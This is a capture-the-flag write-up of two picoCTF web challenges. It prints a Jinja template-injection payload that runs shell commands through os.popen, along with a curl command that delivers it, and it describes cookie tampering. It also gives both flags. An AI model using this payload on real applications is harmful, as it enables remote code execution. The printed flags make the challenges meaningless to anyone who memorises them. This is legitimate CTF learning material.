# 1. SSTI1

> I made a cool website where you can announce whatever you want! Try it out! Additional details will be available after launching your challenge instance.
<br/>> **The challenge demanded that I make use of a server-side template injection attack to display the flag on the screen.**

## Solution:
I made use of the fact that I could write into the template of the website using `{{}}` and the server would return whatever changes I made (respond to the change)
then, I injected the following line into the dialog box.

```
{{url_for.__globals__.os.popen("cat flag").read()}}
```

Web page :

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```

## Concepts learnt:

- **Templates** : Some webpages have dynamic mutable elements that can be changed, they are present in `{{}}`(this depends on syntax, Jinja usese `{{}}`)
- **Template Injections** - When user inputs in templates can be manipulated/tampered with to get data.
- In order to interact with the shell, we need to get into the os module, i.e. find a path to it and then execute whatever we want.
- `url_for` helps in locating any python function(which contaings `import os`)

## Notes:

- The challenge also could be solved using `curl` first to check the vulnerability and then to inject. `curl` is predominantly a command-line tool used to transfer data using URLs.
- `curl` could have been used in the following format to carry out the SSTI attack:
```
payload='{{ url_for.__globals__.os.popen("cat flag").read() }}'
curl -G 'https://vulnerable.target/hello' --data-urlencode "name=${payload}"
```

# 2. Cookies

> Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/]
<br/>> **The challenge demanded that I modify the cookie settings to somehow generate the flag.**

## Solution:
To manipulate the cookie settings, I right clicked on the web page, then followed this path:  **Inspect > Application > Cookies**. there was a pre-existing mutable cookie(`name`).
When I tried changing the value and refreshing the webpage, each time a new message showed up which was not a flag. Hence, I inferred that the every different value of the cookie, is a link to a different web page. Trying random values, I reached 18, which generated the flag like so :

## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_064663be}
```

## Concepts learnt:

- I learned that a cookie is a small piece of data a website stores in your browser to remember the session and identify subsequent requests. By viewing and editing cookies in the browser's Developer Tools values of the cookie can be changed. If the server trusts the cookie value without proper serverâ€‘side checks, changing it can enable access of different pages.
